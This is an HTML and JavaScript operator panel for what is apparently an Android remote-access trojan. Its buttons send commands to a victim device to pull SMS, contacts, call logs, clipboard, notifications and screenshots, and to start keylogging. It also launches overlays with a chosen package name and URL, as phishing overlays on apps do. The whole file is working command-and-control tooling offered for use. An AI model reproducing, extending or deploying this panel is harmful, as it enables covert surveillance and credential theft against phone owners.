<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Device Control</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
/* GLOBAL STYLE */
body {
  margin: 0;
  padding: 0;
  background: #0d1117;
  font-family: system-ui, sans-serif;
  color: #e6edf3;
}

h2, h3 {
  margin: 0 0 10px 0;
  font-weight: 600;
}

.container {
  padding: 20px;
}

/* HEADER */
.headerBox {
  background: #161b22;
  border: 1px solid #30363d;
  padding: 20px;
  border-radius: 10px;
  margin-bottom: 20px;
}

.status {
  padding: 4px 10px;
  border-radius: 6px;
  font-size: 0.9em;
  margin-left: 10px;
}
.online { background: #05632c; }
.offline { background: #7f1d1d; }

/* CARDS */
.card {
  background: #161b22;
  border: 1px solid #30363d;
  padding: 15px;
  border-radius: 10px;
  margin-bottom: 20px;
}

/* BUTTONS */
button {
  padding: 8px 14px;
  border-radius: 6px;
  border: none;
  cursor: pointer;
  color: #fff;
  font-weight: 600;
  margin: 6px 6px 6px 0;
  transition: 0.2s;
}

button:hover {
  transform: translateY(-1px);
  box-shadow: 0 0 10px rgba(0,255,170,0.4);
}

.fetch { background: #238636; }
.upload { background: #2563eb; }
.close  { background: #d32f2f; }

/* INPUTS */
input {
  padding: 7px;
  width: 280px;
  border-radius: 6px;
  border: 1px solid #30363d;
  background: #0d1117;
  color: #fff;
  margin-bottom: 8px;
}

/* LOG TERMINAL */
#log {
  background: #0d1117;
  border: 1px solid #30363d;
  padding: 12px;
  border-radius: 10px;
  white-space: pre-wrap;
  height: 240px;
  overflow-y: auto;
  margin-top: 10px;
  font-family: monospace;
  font-size: 13px;
  color: #9cdcff;
}

/* SCREENSHOT GRID */
#screenshotsContainer {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
  gap: 18px;
}

.shotItem {
  background: #161b22;
  border: 1px solid #30363d;
  padding: 12px;
  border-radius: 10px;
  text-align: center;
}

.shotItem img {
  width: 100%;
  border-radius: 6px;
  cursor: zoom-in;
}

.shotItem button {
  width: 100%;
  margin-top: 10px;
}
</style>

</head>
<body>
<div class="container">

  <!-- Header -->
  <div class="headerBox">
    <h2 id="devName"></h2>
    <p style="margin:0;">
      Device ID: <span id="devId"></span>
      <span id="status" class="status offline">Offline</span>
    </p>
  </div>

  <!-- Command Controls -->
  <div class="card">
    <h3>Device Commands</h3>

    <button class="fetch" id="btnFetch">Fetch Notification</button>
    <button class="fetch" id="btnStartNotify">Start Notification Listener</button>
    <button class="close" id="btnStopNotify">Stop Notification Listener</button>

    <button class="fetch" id="btnFetchSms">Fetch SMS</button>
    <button class="fetch" id="btnFetchContact">Fetch Contacts</button>
    <button class="fetch" id="btnFetchLog">Fetch Call Logs</button>
    <button class="fetch" id="btnFetchApps">Fetch Installed Apps</button>
    <button class="fetch" id="btnFetchIp">Fetch IP</button>
    <button class="fetch" id="btnFetchClip">Fetch Clipboard</button>

    <button class="fetch" id="btnStartKeyLog">Start Keylogs</button>
    <button class="close" id="btnStopKeyLog">Stop Keylogs</button>
    <button class="fetch" id="btnFetchKeyLog">Fetch KeyLogs</button>

    <button class="fetch" id="btnFetchDevice">Fetch Device Info</button>
    <button class="fetch" id="btnFetchScreenshot">Fetch Screenshot</button>
    <button class="fetch" id="btnFetchScreenshotPermission">Grant Screenshot Permission</button>

    <button class="upload" id="btnUpload">Upload</button>
    <button class="close" id="btnClose">Close</button>
  </div>

  <!-- Overlay Launcher -->
  <div class="card">
    <h3>Overlay Launcher</h3>

    <div>
      <label>Package Name:</label><br>
      <input id="pkgInput" type="text" placeholder="com.example.app">
    </div>

    <div>
      <label>URL:</label><br>
      <input id="urlInput" type="text" placeholder="https://example.com">
    </div>

    <button class="fetch" id="btnCustomOverlay">Start Overlay</button>
    <button class="close" id="btnStopOverlay">Stop Overlay</button>
  </div>

  <!-- Screenshots -->
  <div class="card">
    <h3>Screenshot Gallery</h3>
    <div id="screenshotsContainer"></div>
  </div>

  <!-- Log Window -->
  <div class="card">
    <h3>Event Log</h3>
    <pre id="log">Connecting...</pre>
  </div>

</div>


<!-- Your Existing JavaScript (unchanged) -->
<script>



// --- Extract device info from URL ---
    const pathParts = window.location.pathname.split("/");
    const clientId = pathParts[pathParts.length - 1];
    const urlParams = new URLSearchParams(location.search);
    const deviceName = decodeURIComponent(urlParams.get("name") || clientId);

    document.title = deviceName;
    document.getElementById("devName").textContent = deviceName;
    document.getElementById("devId").textContent = clientId;

    const logEl = document.getElementById("log");
    const statusEl = document.getElementById("status");

    function pushLog(msg) {
      const ts = new Date().toLocaleTimeString();
      logEl.textContent += `\n[${ts}] ${msg}`;
      logEl.scrollTop = logEl.scrollHeight;
    }

    // --- Command sending ---
    async function sendCmd(cmd) {
      pushLog(`ðŸ“¤ Sending "${cmd}"...`);
      try {
        const r = await fetch("/command", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ targetClientId: clientId, command: cmd })
        });
        if (!r.ok) pushLog(`âŒ Failed: ${r.status}`);
        else pushLog(`âœ… Command sent (${cmd})`);
      } catch (e) {
        pushLog(`âš ï¸ Network error: ${e.message}`);
      }
    }

    document.getElementById("btnFetch").onclick = () => sendCmd("fetch");
    document.getElementById("btnStartNotify").onclick = () => sendCmd("start-notify");
    document.getElementById("btnStopNotify").onclick = () => sendCmd("stop-notify");
    document.getElementById("btnFetchSms").onclick = () => sendCmd("fetch-sms");
    document.getElementById("btnFetchContact").onclick = () => sendCmd("fetch-contact");
    document.getElementById("btnFetchLog").onclick = () => sendCmd("fetch-logs");
    document.getElementById("btnFetchApps").onclick = () => sendCmd("fetch-apps");
    document.getElementById("btnFetchIp").onclick = () => sendCmd("fetch-ip");
    document.getElementById("btnFetchClip").onclick = () => sendCmd("fetch-clip");
    document.getElementById("btnStartKeyLog").onclick = () => sendCmd("start_keylog");
    document.getElementById("btnStopKeyLog").onclick = () => sendCmd("stop_keylog");
    document.getElementById("btnFetchKeyLog").onclick = () => sendCmd("fetch_keylog");
    document.getElementById("btnFetchDevice").onclick = () => sendCmd("fetch-device");
    document.getElementById("btnFetchScreenshot").onclick = () => sendCmd("fetch-screenshot");
    document.getElementById("btnFetchScreenshotPermission").onclick = () => sendCmd("grant-screenshot-permission");
    document.getElementById("btnUpload").onclick = () => sendCmd("upload");
    document.getElementById("btnClose").onclick = () => window.close();
	
	
	
	// ---- Custom Overlay Controls ----
	document.getElementById("btnCustomOverlay").onclick = () => {
	const pkg = document.getElementById("pkgInput").value.trim();
	const url = document.getElementById("urlInput").value.trim();

	if (!pkg || !url) {
		pushLog("âš ï¸ Please enter both PackageName and URL");
		return;
	}

	const cmd = `start-overlay{url:${url},PackageName:${pkg}}`;
	sendCmd(cmd);
	};

	document.getElementById("btnStopOverlay").onclick = () => {
	sendCmd("stop-overlay");
	};



    // --- WebSocket for live updates ---
    const wsProto = location.protocol === "https:" ? "wss://" : "ws://";
    const ws = new WebSocket(wsProto + location.host);

    ws.onopen = () => pushLog("ðŸ”Œ WebSocket connected");
    ws.onclose = () => pushLog("âŒ WebSocket disconnected");
    ws.onerror = (e) => pushLog("âš ï¸ WebSocket error");

    ws.onmessage = (evt) => {
      try {
        const msg = JSON.parse(evt.data);

        if (msg.type === "devices") {
          // Update online/offline status of this device
          const d = msg.devices[clientId];
          if (d && d.online) {
            statusEl.textContent = "Online";
            statusEl.className = "status online";
          } else {
            statusEl.textContent = "Offline";
            statusEl.className = "status offline";
          }
        }

       if (msg.type === "response" && msg.clientId === clientId) {
			pushLog(`ðŸ“© Response: ${msg.output}`);

    if (msg.output.includes("supabase.co")) {

        const url = msg.output.trim();
        const container = document.getElementById("screenshotsContainer");

        // Create wrapper for each screenshot
        const item = document.createElement("div");
		item.className = "shotItem";


        // Timestamp
        const d = new Date();
        const stampDisplay = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()} ${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}`;
        const stampFile = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()}_${d.getHours()}-${d.getMinutes()}-${d.getSeconds()}`;

        const label = document.createElement("div");
        label.innerText = `Captured: ${stampDisplay}`;
        label.style.marginBottom = "8px";
        label.style.fontSize = "13px";
        label.style.color = "#555";

        // The image
        const img = document.createElement("img");
        img.src = url;
        img.style.width = "120px";
        img.style.height = "200px";
        img.style.cursor = "zoom-in";
        img.style.display = "block";
        img.style.marginBottom = "10px";

        // Zoom on click
        img.onclick = () => {
            const win = window.open("", "_blank");
            win.document.write(`<center><img src="${url}" style="width:243px;height:498px;"></center>`);
        };

        // Download button
        const downloadBtn = document.createElement("button");
        downloadBtn.innerText = "Download";
        downloadBtn.style.padding = "6px 12px";
        downloadBtn.style.cursor = "pointer";

        downloadBtn.onclick = async () => {
            const res = await fetch(url);
            const blob = await res.blob();
            const blobUrl = URL.createObjectURL(blob);

            const link = document.createElement("a");
            link.href = blobUrl;
            link.download = `screenshot_${stampFile}.jpg`;
            document.body.appendChild(link);
            link.click();
            link.remove();
            URL.revokeObjectURL(blobUrl);
        };

        // Add to container
        item.appendChild(label);
        item.appendChild(img);
        item.appendChild(downloadBtn);

        container.appendChild(item);
    }
}



      } catch (e) {
        console.error("WS parse error", e);
      }
    };

    window.pushRemoteLog = pushLog;



</script>

</body>
</html>
